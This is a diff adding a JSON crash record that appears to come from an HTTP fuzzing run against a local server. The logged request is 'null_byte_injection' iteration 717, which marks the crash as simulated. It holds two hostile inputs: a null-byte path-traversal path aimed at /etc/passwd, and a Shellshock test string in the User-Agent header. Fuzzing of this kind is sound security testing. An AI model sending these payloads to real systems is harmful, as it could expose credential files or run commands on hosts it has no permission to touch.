@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:42:22.709685",
+  "crash_type": "null_byte_injection",
+  "payload": "OPTIONS /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': '() { :; }; echo vulnerable', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Http-Method-Override': 'Content-Range: bytes 0-10/100', 'Accept-Language': 'http://localhost', 'Content-Length': '0'}",
+  "payload_hash": "f47f5c5a51d83199",
+  "request_method": "OPTIONS",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "() { :; }; echo vulnerable",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Http-Method-Override": "Content-Range: bytes 0-10/100",
+    "Accept-Language": "http://localhost",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated null_byte_injection",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 717
+}
